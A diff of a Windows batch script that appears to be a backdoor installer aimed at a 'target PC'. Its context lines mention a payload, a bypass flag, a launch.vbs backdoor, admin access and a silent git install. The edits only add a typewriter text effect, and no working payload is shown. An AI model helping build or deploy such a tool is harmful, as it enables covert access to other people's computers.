@@ -1,6 +1,7 @@
 :: setup
 :start
 @ECHO OFF
+setlocal enabledelayedexpansion
 set update_number=V3.31.24
 set dev=1
 cls
@@ -14,8 +15,6 @@ ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
 CSCRIPT //nologo "%TempVBSFile%"
 set temp=0&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=true
 title unstable Release %update_number%
-@Echo Off
-
 cls
 if %username% equ 61481 goto skip_dev
 if %username% neq luken if %dev% equ 1 goto dev
@@ -38,11 +37,7 @@ if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
 if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
 :no_remove_backdoor
 :: manual configuration
-@Echo Off
-Set "STRING=version: %update_number%"
-For /F %%A In ('"Prompt $H&For %%B In (1) Do Rem"') Do Set "BS=%%A"
-For /F Delims^=^ EOL^= %%A In ('"(CMD/U/CEcho=%STRING%)|Find /V """'
-) Do Set/P "=a%BS%%%A"<Nul & PathPing 127.0.0.1 -n -q 1 -p 100 1>Nul
+  call :TypeWriter "current version: %update_number%"
   echo.
   echo [31madmin backdoor is currently broken, do no use this[0m
   echo do you have admin permissions on the target PC?
@@ -298,3 +293,24 @@ echo [33minstalling git...[0m
 gitDL.exe /silent
 del gitDL.exe
 goto start
+:TypeWriter
+set string=%1
+call :GetLength %string%
+set string=%string:"=%
+set /a length=%len_%
+for /l %%A in (1,1,%length%) do (
+cls
+echo !string:~0,%%A!
+ping localhost -n 1 -w 500 -l 5000 > nul
+)
+:GetLength
+set str=%1
+set /a len=1
+:loop
+set /a len_=%len% - 1
+if "!str:~0,%len%!"=="!str:~0,%len_%!" goto done
+set /a len+=1
+goto loop
+:done
+set /a len_-=2
+goto :eof
